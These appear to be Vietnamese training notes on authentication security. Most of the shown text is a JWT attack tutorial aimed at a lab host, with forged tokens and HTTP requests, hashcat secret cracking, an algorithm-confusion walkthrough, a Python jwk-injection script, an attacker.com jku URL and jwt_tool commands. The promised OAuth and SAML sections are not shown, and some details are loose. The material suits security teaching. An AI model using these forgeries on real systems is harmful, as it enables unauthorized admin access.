Dưới đây là chỉ mục liên kết theo yêu cầu của bạn:

# Giới thiệu về cơ chế xác thực (Authentication Mechanisms)

1. [Giới thiệu về JWT (JSON Web Token)](#1-giới-thiệu-về-jwt-json-web-token)
2. [Tấn công vào cơ chế xác minh chữ ký của JWT (Attacking Signature Verification)](#2-tấn-công-vào-cơ-chế-xác-minh-chữ-ký-của-jwt-attacking-signature-verification)
3. [Tấn công vào khóa bí mật ký JWT (Attacking the Signing Secret)](#3-tấn-công-vào-khóa-bí-mật-ký-jwt-attacking-the-signing-secret)
4. [Tấn công kiểu nhầm lẫn thuật toán (Algorithm Confusion Attack)](#4-tấn-công-kiểu-nhầm-lẫn-thuật-toán-algorithm-confusion-attack)
5. [Các tấn công khác vào JWT (Further JWT Attacks)](#5-các-tấn-công-khác-vào-jwt-further-jwt-attacks)
6. [Công cụ và cách phòng tránh lỗ hổng JWT (Tools of the Trade & Vulnerability Prevention)](#6-công-cụ-và-cách-phòng-tránh-lỗ-hổng-jwt-tools-of-the-trade-vulnerability-prevention)

# Giới thiệu về OAuth

1. [Thiết lập môi trường lab OAuth (OAuth Lab Setup)](#1-thiết-lập-môi-trường-lab-oauth-oauth-lab-setup)
2. [Stealing Access Tokens (Lấy Cắp Access Token)](#2-stealing-access-tokens-lấy-cắp-access-token)
3. [Giải thích về "Improper CSRF Protection" trong OAuth](#3-giải-thích-về-improper-csrf-protection-trong-oauth)
4. [Các Lỗ Hổng Bảo Mật OAuth](#4-các-lỗ-hổng-bảo-mật-oauth)
5. [Phòng Ngừa Lỗ Hổng OAuth](#5-phòng-ngừa-lỗ-hổng-oauth)

# Giới Thiệu về SAML

1. [SAML Lab Setup](#saml-lab-setup)
2. [Tấn công "Signature Exclusion" trong SAML](#tấn-công-signature-exclusion-trong-saml)
3. [Tấn công Signature Wrapping trong SAML](#tấn-công-signature-wrapping-trong-saml)
4. [Các lỗ hổng bổ sung trong SAML](#các-lỗ-hổng-bổ-sung-trong-saml)
5. [Công cụ và Phòng ngừa Lỗ hổng SAML](#công-cụ-và-phòng-ngừa-lỗ-hổng-saml)
===
===
# Giới thiệu về cơ chế xác thực (Authentication Mechanisms)

### 1. **Cơ chế xác thực và ủy quyền (Authentication vs. Authorization)**

**Xác thực (Authentication):**
- Là quá trình kiểm tra danh tính của người dùng.
- Ví dụ: Khi bạn đăng nhập vào một trang web, bạn nhập tên người dùng và mật khẩu để chứng minh bạn là ai.

**Ủy quyền (Authorization):**
- Là quá trình kiểm soát quyền truy cập của người dùng sau khi đã xác thực.
- Ví dụ: Sau khi đăng nhập, nếu bạn là admin, bạn có quyền chỉnh sửa nội dung; còn nếu bạn là người dùng thường, bạn chỉ có thể xem nội dung.

**Ví dụ minh họa:**
- Bạn vào một tòa nhà (xác thực): Bạn phải xuất trình thẻ nhân viên để bảo vệ kiểm tra danh tính.
- Sau khi vào bên trong (ủy quyền): Nếu bạn là nhân viên phòng IT, bạn có thể vào phòng máy chủ; nếu bạn là nhân viên văn phòng, bạn chỉ có thể vào khu vực làm việc chung.

### 2. **Những cơ chế kiểm soát truy cập phổ biến:**

- **Discretionary Access Control (DAC):** Người dùng có thể cấp quyền cho người khác dựa trên ý muốn cá nhân.
- **Mandatory Access Control (MAC):** Quyền truy cập được kiểm soát bởi chính sách an ninh, không thể thay đổi bởi người dùng.
- **Role-Based Access Control (RBAC):** Quyền truy cập dựa trên vai trò (như admin, người dùng thường).
- **Attribute-Based Access Control (ABAC):** Quyền truy cập dựa trên thuộc tính của người dùng (như vị trí, thời gian truy cập).

**Ví dụ RBAC:**
- Admin có quyền chỉnh sửa và xóa bài viết.
- Người dùng thường chỉ có quyền xem bài viết.

### 3. **Broken Authentication (Xác thực không an toàn):**

Khi cơ chế xác thực được triển khai sai, sẽ dễ dàng bị tấn công, gây ra các lỗ hổng bảo mật.

**Ví dụ về tấn công:**
- **Brute-forcing:** Hacker thử nhiều tên người dùng và mật khẩu để đoán đúng thông tin đăng nhập.
- **JWT Manipulation:** Hacker thay đổi nội dung của JSON Web Token để truy cập trái phép.

### 4. **JSON Web Token (JWT):**

**JWT là gì?**
- JWT là một định dạng token để truyền dữ liệu một cách an toàn.
- **Cấu trúc:** Gồm 3 phần: Header (thông tin về thuật toán), Payload (dữ liệu), và Signature (chữ ký).

**Ví dụ về JWT:**
```json
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdHVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.s3cr3tsignatur3
```
- Nếu hacker có thể thay đổi phần Payload (ví dụ thay "role" thành "admin"), họ có thể truy cập trái phép vào hệ thống.

### 5. **OAuth (Open Authorization):**

- **OAuth là gì?** Một giao thức mở cho phép cấp quyền truy cập giữa các dịch vụ mà không cần chia sẻ mật khẩu của người dùng.
- **Ví dụ:** Khi bạn đăng nhập vào một ứng dụng bằng tài khoản Google, OAuth sẽ cấp quyền cho ứng dụng mà không cần tiết lộ mật khẩu của bạn.

**Luồng hoạt động của OAuth:**
1. Ứng dụng yêu cầu quyền truy cập từ người dùng.
2. Người dùng đồng ý cấp quyền.
3. Ứng dụng nhận được token truy cập và sử dụng nó để truy cập thông tin của người dùng.

### 6. **SAML (Secure Assertion Markup Language):**

- **SAML là gì?** Một chuẩn mở dựa trên XML để trao đổi dữ liệu xác thực và ủy quyền giữa nhà cung cấp danh tính (IdP) và nhà cung cấp dịch vụ (SP).
- **Ví dụ:** Trong một tổ chức, khi bạn đăng nhập một lần vào hệ thống, bạn có thể truy cập các ứng dụng khác mà không cần đăng nhập lại (Single Sign-On).

**Luồng hoạt động của SAML:**
1. Người dùng yêu cầu truy cập dịch vụ.
2. IdP xác thực danh tính người dùng và tạo một thông báo xác thực.
3. SP nhận thông báo này, kiểm tra chữ ký và cấp quyền truy cập cho người dùng.

---
# 1. Giới thiệu về JWT (JSON Web Token)

**JWT là gì?**
- JWT là một dạng token dùng để truyền dữ liệu một cách an toàn giữa các bên. JWT có thể chứa thông tin về người dùng, thông tin xác thực và ủy quyền.
- JWT thường được sử dụng trong các ứng dụng web như một **token xác thực không trạng thái** (stateless token).

### **Cấu trúc của JWT**
JWT bao gồm 3 phần chính, được phân tách bởi dấu chấm (`.`):
1. **Header**: Chứa thông tin về thuật toán mã hóa và loại token.
2. **Payload**: Chứa dữ liệu (claims) về người dùng hoặc phiên làm việc.
3. **Signature**: Là chữ ký để đảm bảo tính toàn vẹn của token.

Ví dụ về JWT:
```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJIVEItQWNhZGVteSIsInVzZXIiOiJhZG1pbiIsImlzQWRtaW4iOnRydWV9.Chnhj-ATkcOfjtn8GCHYvpNE-9dmlhKTCUwl6pxTZEA
```

### **1. Header**
Header chứa thông tin về loại token và thuật toán mã hóa. Thường sẽ có hai thuộc tính:
- **`typ`**: Thường là `"JWT"`.
- **`alg`**: Chỉ định thuật toán mã hóa, ví dụ `"HS256"`.

**Ví dụ về Header (sau khi giải mã Base64):**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Các giá trị thuật toán phổ biến:**
- **HS256**: HMAC với SHA-256.
- **RS256**: RSA với SHA-256.
- **none**: Không có chữ ký (không nên sử dụng vì dễ bị tấn công).

### **2. Payload**
Payload chứa dữ liệu chính của token, bao gồm các **claims**:
- **Registered claims**: Là các claims đã được chuẩn hóa, ví dụ:
  - **`iss`** (Issuer): Nguồn phát hành token.
  - **`sub`** (Subject): Đối tượng của token.
  - **`exp`** (Expiration Time): Thời gian hết hạn của token.
- **User-defined claims**: Các claims do người dùng tự định nghĩa, ví dụ:
  - **`user`**: Tên người dùng.
  - **`isAdmin`**: Xác định vai trò người dùng.

**Ví dụ về Payload (sau khi giải mã Base64):**
```json
{
  "iss": "HTB-Academy",
  "user": "admin",
  "isAdmin": true
}
```

### **3. Signature**
Chữ ký được tạo ra bằng cách mã hóa kết hợp giữa Header và Payload với một **secret key** và thuật toán đã chỉ định trong Header.
- **Công thức tạo Signature:**
```text
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
```

Chữ ký giúp đảm bảo tính toàn vẹn của token. Nếu Header hoặc Payload bị thay đổi, chữ ký sẽ không hợp lệ.

### **Ví dụ về JWT hoàn chỉnh:**
```text
Header.Payload.Signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJIVEItQWNhZGVteSIsInVzZXIiOiJhZG1pbiIsImlzQWRtaW4iOnRydWV9.Chnhj-ATkcOfjtn8GCHYvpNE-9dmlhKTCUwl6pxTZEA
```

### **Xác thực dựa trên JWT (JWT-based Authentication)**

#### **Stateful Authentication (Xác thực có trạng thái)**
- Truyền thống, khi người dùng đăng nhập, server sẽ tạo một session token và lưu trữ trên cơ sở dữ liệu. Server cần giữ trạng thái của phiên làm việc (session state).
- **Nhược điểm:** Yêu cầu lưu trữ session trên server, không hiệu quả khi số lượng người dùng lớn.

#### **Stateless Authentication (Xác thực không trạng thái)**
- JWT chứa toàn bộ thông tin cần thiết về người dùng. Sau khi đăng nhập, server sẽ trả về một JWT cho client.
- Khi client gửi yêu cầu, server chỉ cần kiểm tra chữ ký của JWT để xác thực mà không cần truy vấn cơ sở dữ liệu.
- **Ưu điểm:** Không cần lưu trạng thái, dễ dàng mở rộng (scalable).
- **Nhược điểm:** Nếu JWT bị đánh cắp, hacker có thể sử dụng nó trong suốt thời gian token còn hiệu lực.

### **Ví dụ minh họa về Stateless Authentication:**
1. Người dùng đăng nhập và nhận được JWT.
2. Client lưu JWT (thường ở localStorage hoặc cookies).
3. Khi người dùng gửi yêu cầu API, JWT được gửi kèm theo.
4. Server kiểm tra chữ ký của JWT để xác thực và xử lý yêu cầu.

**Lưu ý:** JWT cần có thời gian hết hạn (`exp`) để tránh việc token bị lợi dụng quá lâu nếu bị đánh cắp.

---
# 2. Tấn công vào cơ chế xác minh chữ ký của JWT (Attacking Signature Verification)

#### **1. Bảo vệ dữ liệu bằng chữ ký của JWT**
Chữ ký của JWT đóng vai trò quan trọng trong việc đảm bảo tính toàn vẹn của dữ liệu trong JWT. Chữ ký được tạo từ phần **Header** và **Payload**, sau đó mã hóa bằng một khóa bí mật (secret key). Nếu bất kỳ phần nào trong JWT bị thay đổi, chữ ký sẽ không còn khớp, và server sẽ từ chối JWT này.

#### **2. Lỗ hổng: Thiếu xác minh chữ ký (Missing Signature Verification)**
Trong một số trường hợp, nếu ứng dụng web **không kiểm tra chữ ký** của JWT, hacker có thể dễ dàng chỉnh sửa nội dung Payload và gửi lại token mà không bị phát hiện.

**Ví dụ minh họa:**
- Một trang web có chức năng đăng nhập và sử dụng JWT làm session cookie.
- Sau khi đăng nhập, người dùng nhận được JWT như sau:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6ZmFsc2UsImV4cCI6MTcxMTE4NjA0NH0.ecpzHiyA5I1-KYTTF251bUiUMtNnrIMwvHeSZf0eB0
```

**Payload sau khi giải mã:**
```json
{
  "user": "htb-stdnt",
  "isAdmin": false,
  "exp": 1711186044
}
```

- Người dùng nhận thấy claim `"isAdmin": false`. Hacker có thể lợi dụng điểm này để thay đổi `"isAdmin": true` và tạo lại JWT với nội dung mới.

**Payload mới:**
```json
{
  "user": "htb-stdnt",
  "isAdmin": true,
  "exp": 1711186044
}
```

- Sau khi chỉnh sửa, hacker có thể sử dụng công cụ như **jwt.io** để mã hóa lại JWT.
- Nếu ứng dụng không kiểm tra chữ ký, token mới sẽ được server chấp nhận và hacker sẽ có quyền admin.

**Yêu cầu HTTP với JWT đã chỉnh sửa:**
```http
GET /home HTTP/1.1
Host: 172.17.0.2
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6dHJ1ZSwiZXhwIjoxNzExMTg2MDQ0fQ.S85PjpnL6BNhBCWk6OYDHc_XjfWogMJV8wq5pKJ6Tv4
```

- **Kết quả:** Server cấp quyền admin cho hacker do không kiểm tra chữ ký.

#### **3. Tấn công sử dụng thuật toán "none" (None Algorithm Attack)**
Thuật toán `"none"` trong JWT có nghĩa là không có chữ ký. Nếu ứng dụng chấp nhận thuật toán `"none"`, hacker có thể tạo JWT mà không cần chữ ký.

**Ví dụ minh họa:**
1. Hacker tạo JWT mới với Header:
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

2. Payload:
```json
{
  "user": "htb-stdnt",
  "isAdmin": true,
  "exp": 1711186044
}
```

3. JWT hoàn chỉnh:
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6dHJ1ZSwiZXhwIjoxNzExMTg2MDQ0fQ.
```

- **Yêu cầu HTTP với JWT sử dụng thuật toán "none":**
```http
GET /home HTTP/1.1
Host: 172.17.0.2
Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6dHJ1ZSwiZXhwIjoxNzExMTg2MDQ0fQ.
```

- **Kết quả:** Nếu server không kiểm tra chữ ký, hacker sẽ được cấp quyền admin.

**Lưu ý:** Dù JWT sử dụng thuật toán `"none"`, phần cuối cùng vẫn phải có dấu chấm (`.`) để đảm bảo định dạng JWT hợp lệ.

---
# 3. Tấn công vào khóa bí mật ký JWT (Attacking the Signing Secret)

#### **1. Ý tưởng tấn công**
Khóa bí mật (signing secret) được sử dụng để tạo chữ ký cho JWT nhằm đảm bảo tính toàn vẹn của token. Nếu hacker biết được khóa bí mật này, họ có thể tạo ra JWT hợp lệ mà không cần phải bypass cơ chế xác minh chữ ký. Trong một số trường hợp, hacker có thể sử dụng phương pháp brute-force để tìm ra khóa bí mật nếu nó quá yếu hoặc dễ đoán.

#### **2. Các thuật toán ký JWT phổ biến**
JWT hỗ trợ các thuật toán ký đối xứng phổ biến sau, dựa trên khóa bí mật:
- **HS256**: HMAC với SHA-256.
- **HS384**: HMAC với SHA-384.
- **HS512**: HMAC với SHA-512.

#### **3. Lấy JWT hợp lệ**
Hacker sẽ cần một JWT hợp lệ từ ứng dụng web, thường bằng cách đăng nhập hoặc thu thập từ yêu cầu HTTP.

**Ví dụ về JWT hợp lệ:**
```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6ZmFsc2UsImV4cCI6MTcxMTIwNDYzN30.r_rYB0tvuiA2scNQrmzBaMAG2rkGdMu9cGMEEl3WTW0
```

#### **4. Kiểm tra thuật toán ký**
Hacker có thể kiểm tra thuật toán ký được sử dụng bằng cách giải mã phần **Header** của JWT. Trong ví dụ trên, thuật toán ký là **HS256**.

**Header sau khi giải mã:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

#### **5. Tấn công brute-force khóa bí mật**
Hacker có thể sử dụng công cụ như **hashcat** để brute-force khóa bí mật của JWT.

**Chuẩn bị JWT cho hashcat:**
```bash
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6ZmFsc2UsImV4cCI6MTcxMTIwNDYzN30.r_rYB0tvuiA2scNQrmzBaMAG2rkGdMu9cGMEEl3WTW0" > jwt.txt
```

**Chạy hashcat với wordlist (ví dụ: rockyou.txt):**
```bash
hashcat -m 16500 jwt.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

**Kết quả của hashcat:**
```text
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaH...l3WTW0
Time.Started.....: Sat Mar 23 15:24:17 2024 (2 secs)
Speed.#1.........:  3475.1 kH/s
Recovered........: 1/1 (100.00%)
Candidates.#1....: rb270990 -> rayruben1
```

Trong ví dụ này, hashcat đã tìm ra khóa bí mật là **"rayruben1"**.

#### **6. Tạo JWT giả mạo (Forging a Token)**
Khi hacker đã biết được khóa bí mật, họ có thể tạo ra JWT giả mạo mà vẫn hợp lệ.

**Payload mới:**
```json
{
  "user": "htb-stdnt",
  "isAdmin": true,
  "exp": 1711186044
}
```

**Tạo JWT mới bằng cách sử dụng khóa bí mật "rayruben1" trên jwt.io:**
- Dán Payload vào jwt.io.
- Chọn thuật toán là **HS256** và nhập khóa bí mật là "rayruben1".
- jwt.io sẽ tự động tạo ra JWT với chữ ký hợp lệ.

**JWT giả mạo:**
```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6dHJ1ZSwiZXhwIjoxNzExMTIwNDYzN30.s3cr3tsignatur3
```

#### **7. Sử dụng JWT giả mạo**
Hacker có thể sử dụng JWT mới này để gửi yêu cầu HTTP và có quyền truy cập admin.

**Yêu cầu HTTP:**
```http
GET /home HTTP/1.1
Host: 172.17.0.2
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6dHJ1ZSwiZXhwIjoxNzExMTIwNDYzN30.s3cr3tsignatur3
```

**Kết quả:** Hacker có quyền truy cập admin vào ứng dụng web.

---
# 4. Tấn công kiểu nhầm lẫn thuật toán (Algorithm Confusion Attack)

#### **1. Khái niệm về tấn công nhầm lẫn thuật toán**
Nhầm lẫn thuật toán là một kiểu tấn công vào JWT nhằm ép buộc ứng dụng web sử dụng một thuật toán khác để kiểm tra chữ ký của JWT, khác với thuật toán được sử dụng để tạo chữ ký. Điều này đặc biệt xảy ra khi ứng dụng web chấp nhận bất kỳ thuật toán nào được chỉ định trong phần **`alg`** của JWT mà không kiểm tra chặt chẽ.

#### **2. Sự khác biệt giữa thuật toán đối xứng và bất đối xứng**
- **Thuật toán đối xứng (Symmetric Algorithm)**: Ví dụ như **HS256**, sử dụng cùng một khóa bí mật để ký và xác minh JWT.
- **Thuật toán bất đối xứng (Asymmetric Algorithm)**: Ví dụ như **RS256**, sử dụng **khóa riêng (private key)** để ký và **khóa công khai (public key)** để xác minh.

**Lỗ hổng xảy ra khi:**
- Ứng dụng web sử dụng thuật toán bất đối xứng (RS256) để tạo JWT, nhưng lại chấp nhận kiểm tra JWT bằng thuật toán đối xứng (HS256).
- Hacker có thể tạo JWT giả mạo bằng khóa công khai (public key), vốn không được bảo mật và có thể dễ dàng thu thập.

#### **3. Cách thực hiện tấn công Algorithm Confusion**
**Bước 1: Lấy JWT hợp lệ**
- Hacker cần một JWT hợp lệ từ ứng dụng web, thường có thuật toán là **RS256** (sử dụng bất đối xứng).
- Ví dụ về JWT:
```text
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6ZmFsc2UsImV4cCI6MTcxMTI3MTkyOX0.<signature>
```

**Bước 2: Lấy khóa công khai**
- Khóa công khai thường được công khai trên website hoặc có thể được trích xuất từ chính JWT nếu biết các công cụ thích hợp.
- Hacker có thể sử dụng công cụ **rsa_sign2n** để tính toán khóa công khai từ các JWT đã thu thập được.

**Cách sử dụng `rsa_sign2n`:**
```bash
git clone https://github.com/silentsignal/rsa_sign2n
cd rsa_sign2n/standalone/
docker build . -t sig2n
docker run -it sig2n /bin/bash
```

- Hacker cung cấp cho công cụ hai JWT khác nhau được ký bởi cùng một khóa riêng. Công cụ sẽ tính toán và xuất ra khóa công khai.

**Ví dụ kết quả:**
```text
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsZaSaPDmaxyds/NMppno
dUEWomQEdu+p57T4B7tjCZp0nRQk1HnOR8LuTztHn6U4ZKEHvHWGF7PxHHgtxrTb
7uhbwhsu3XVTcd1c/S2G9TCvW4WaF8uqNjgzUJEANsABGXHSVCuM7CLf2jWjVyWX
6w4dbyK3LNHvt/tkJspeGwx3wT1Gq2RpQ6n0+J/q6vxKBAc4z9QuzfgLPpnZFdYj
kZyJimyFmiyPDP6k2MZYr6rgiuUhCQQlFBL8yS94dITAoZhGIJDtNW9WDV7gOB8t
OgPrAdBM2rm8SmlNjsaHxIDec2E+qafCm8VnwSLXHXb9IDvLSTCqI+gOSJEGgTuT
VQIDAQAB
-----END PUBLIC KEY-----
```

**Bước 3: Tạo JWT giả mạo với HS256**
- Hacker tạo JWT giả mạo nhưng chỉ định thuật toán là **HS256** thay vì **RS256**.
- Họ sử dụng công cụ như **CyberChef**:
  - Chọn **JWT Sign**.
  - Đặt thuật toán là **HS256**.
  - Sử dụng khóa công khai như là khóa bí mật (secret key).

**Payload của JWT mới:**
```json
{
  "user": "htb-stdnt",
  "isAdmin": true,
  "exp": 1711186044
}
```

- JWT giả mạo sau khi ký:
```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogdHJ1ZSwiZXhwIjoxNzExMzU2NTczfQ.Dq6bu6oNyTKStTD6YycB9EzmXoTiMJ9aKu_nNMLx7RM
```

**Bước 4: Gửi JWT giả mạo đến ứng dụng web**
- Hacker gửi JWT giả mạo trong yêu cầu HTTP để chiếm quyền admin.

**Yêu cầu HTTP:**
```http
GET /admin HTTP/1.1
Host: 172.17.0.2
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogdHJ1ZSwiZXhwIjoxNzExMzU2NTczfQ.Dq6bu6oNyTKStTD6YycB9EzmXoTiMJ9aKu_nNMLx7RM
```

- **Kết quả:** Ứng dụng web chấp nhận JWT giả mạo và cấp quyền admin cho hacker.

---
# 5. Các tấn công khác vào JWT (Further JWT Attacks)

#### **1. Reusing JWT Secrets (Tái sử dụng khóa bí mật)**
Một trong những lỗ hổng phổ biến là việc **tái sử dụng khóa bí mật** cho nhiều ứng dụng web khác nhau. Nếu các ứng dụng chia sẻ cùng một khóa bí mật để ký JWT, hacker có thể lợi dụng JWT từ một ứng dụng này để truy cập vào ứng dụng khác.

**Ví dụ:**
- Công ty sở hữu hai trang mạng xã hội: **socialA.htb** và **socialB.htb**.
- Người dùng có vai trò **moderator** trên **socialA**, nhưng chỉ là người dùng bình thường trên **socialB**.
- JWT trên **socialA** chứa claim `"role": "moderator"`:
  ```json
  {
    "user": "exampleUser",
    "role": "moderator"
  }
  ```
- Nếu cả hai ứng dụng sử dụng cùng một khóa bí mật, hacker có thể sử dụng JWT từ **socialA** trên **socialB** để truy cập quyền **moderator**.

**Phòng chống:**
- Mỗi ứng dụng phải có khóa bí mật riêng biệt để ký JWT.
- Không chia sẻ khóa bí mật giữa các dịch vụ khác nhau.

#### **2. Exploiting the `jwk` Claim**
**Claim `jwk`** chứa thông tin về khóa công khai dùng để xác minh JWT. Nếu ứng dụng web chấp nhận bất kỳ khóa công khai nào được cung cấp trong claim `jwk`, hacker có thể tạo ra JWT giả mạo và cung cấp khóa công khai của riêng họ trong claim `jwk`.

**Cách thực hiện tấn công:**
1. Tạo cặp khóa riêng và khóa công khai:
   ```bash
   openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
   openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
   ```

2. Sử dụng khóa riêng để ký JWT và chèn khóa công khai vào claim `jwk`.

**Script Python tự động khai thác:**
```python
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from jose import jwk
import jwt

# Payload của JWT
jwt_payload = {'user': 'htb-stdnt', 'isAdmin': True}

# Chuyển đổi PEM thành JWK
with open('exploit_public.pem', 'rb') as f:
    public_key_pem = f.read()
    public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
    jwk_key = jwk.construct(public_key, algorithm='RS256')
    jwk_dict = jwk_key.to_dict()

# Ký JWT
with open('exploit_private.pem', 'rb') as f:
    private_key_pem = f.read()
    token = jwt.encode(jwt_payload, private_key_pem, algorithm='RS256', headers={'jwk': jwk_dict})

print(token)
```

**Kết quả:**
JWT giả mạo sẽ chứa khóa công khai của hacker trong claim `jwk`, và ứng dụng web sẽ chấp nhận token này vì chữ ký hợp lệ.

**Phòng chống:**
- Không chấp nhận claim `jwk` từ người dùng.
- Chỉ sử dụng khóa công khai cố định từ cấu hình của server.

#### **3. Exploiting the `jku` Claim**
Claim **`jku`** chứa URL đến một tập hợp các khóa công khai được mã hóa JSON Web Key (JWK Set). Hacker có thể lợi dụng claim này bằng cách đặt URL trỏ đến server của họ và cung cấp khóa công khai giả mạo.

**Quy trình tấn công:**
1. Hacker tạo server chứa JWK Set với khóa công khai của họ.
2. Tạo JWT giả mạo với claim `jku` trỏ đến URL của hacker:
   ```json
   {
     "alg": "RS256",
     "jku": "https://attacker.com/jwks.json"
   }
   ```

3. Nếu ứng dụng web không kiểm tra nguồn gốc URL, nó sẽ truy vấn URL của hacker để lấy khóa công khai và xác minh JWT giả mạo.

**Phòng chống:**
- Chỉ chấp nhận các URL trong claim `jku` từ nguồn tin cậy.
- Kiểm tra chặt chẽ URL và sử dụng TLS để đảm bảo an toàn.

#### **4. Blind Server Side Request Forgery (SSRF) thông qua `jku` Claim**
Claim `jku` có thể được lợi dụng để thực hiện tấn công **SSRF mù** nếu ứng dụng web không kiểm tra kỹ URL. Hacker có thể đặt URL trỏ đến một server nội bộ mà hacker không thể truy cập trực tiếp, từ đó ép buộc server thực hiện yêu cầu GET đến server nội bộ.


#### **5. Các Claims khác có thể khai thác**
- **`x5c` và `x5u` Claims**: Cung cấp thông tin về chứng chỉ hoặc chuỗi chứng chỉ. Tấn công vào các claim này tương tự như `jwk` và `jku`.
- **`kid` Claim**: Xác định khóa được sử dụng để ký JWT. Nếu ứng dụng xử lý claim này không đúng cách, có thể dẫn đến các lỗ hổng như **path traversal**, **SQL injection**, hoặc **command injection**.

---
# 6. Công cụ và cách phòng tránh lỗ hổng JWT (Tools of the Trade & Vulnerability Prevention)

#### **1. Công cụ thường dùng để khai thác JWT (Tools of the Trade)**

Một trong những công cụ phổ biến nhất cho việc kiểm tra và khai thác lỗ hổng JWT là **jwt_tool**. Đây là một công cụ mạnh mẽ giúp phân tích, kiểm tra và khai thác các lỗ hổng liên quan đến JWT.

**Cài đặt `jwt_tool`:**
```bash
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r jwt_tool/requirements.txt
```

Sau khi cài đặt, bạn có thể chạy công cụ bằng lệnh:
```bash
python3 jwt_tool/jwt_tool.py
```

**Các tính năng nổi bật của `jwt_tool`:**
- Phân tích JWT.
- Brute-force khóa bí mật của JWT.
- Tấn công các lỗ hổng phổ biến như `alg: none`, JWKS spoofing, và key confusion.

**Ví dụ: Phân tích JWT với `jwt_tool`:**
```bash
python3 jwt_tool/jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6ZmFsc2UsImV4cCI6MTcxMTE4NjA0NH0.ecpzHiyA5I1-KYTTF251bUiUMtNnrIMwvHeSZf0eB0
```

**Kết quả phân tích:**
- Header:
  ```json
  {
    "alg": "HS256",
    "typ": "JWT"
  }
  ```
- Payload:
  ```json
  {
    "user": "htb-stdnt",
    "isAdmin": false,
    "exp": 1711186044
  }
  ```
- Token đã hết hạn (timestamp trong claim `exp` đã qua).

#### **2. Khai thác JWT bằng `jwt_tool`**

**Ví dụ: Tấn công `alg: none`**
JWT với thuật toán `none` có thể dễ dàng bị khai thác nếu ứng dụng chấp nhận JWT mà không có chữ ký.

```bash
python3 jwt_tool/jwt_tool.py -X a -pc isAdmin -pv true -I eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6ZmFsc2UsImV4cCI6MTcxMTE4NjA0NH0.ecpzHiyA5I1-KYTTF251bUiUMtNnrIMwvHeSZf0eB0
```

- `-X a`: Sử dụng tấn công `alg: none`.
- `-pc isAdmin -pv true`: Thay đổi claim `isAdmin` thành `true`.
- `-I`: Đầu vào là JWT hợp lệ.

**Kết quả:**
JWT mới sẽ có claim `"alg": "none"`, cho phép bỏ qua xác minh chữ ký.

---
---
# Giới thiệu về OAuth

**OAuth** là một giao thức cho phép ủy quyền an toàn giữa các dịch vụ mà không cần chia sẻ thông tin đăng nhập của người dùng. OAuth thường được sử dụng trong các tình huống **Single Sign-On (SSO)**, cho phép người dùng đăng nhập vào một dịch vụ và truy cập nhiều dịch vụ khác nhau.

#### **Các thành phần chính trong OAuth**
1. **Resource Owner (Chủ sở hữu tài nguyên)**: Thường là người dùng.
2. **Client (Ứng dụng khách)**: Dịch vụ yêu cầu quyền truy cập tài nguyên thay mặt cho người dùng.
3. **Authorization Server (Máy chủ ủy quyền)**: Máy chủ xác thực người dùng và phát hành token truy cập cho client.
4. **Resource Server (Máy chủ tài nguyên)**: Máy chủ lưu trữ tài nguyên mà client muốn truy cập.

#### **Luồng giao tiếp trong OAuth**
1. Client yêu cầu quyền ủy quyền từ người dùng.
2. Người dùng cấp quyền ủy quyền cho client.
3. Client gửi yêu cầu ủy quyền đến máy chủ ủy quyền.
4. Máy chủ ủy quyền phát hành token truy cập cho client.
5. Client gửi token truy cập đến máy chủ tài nguyên.
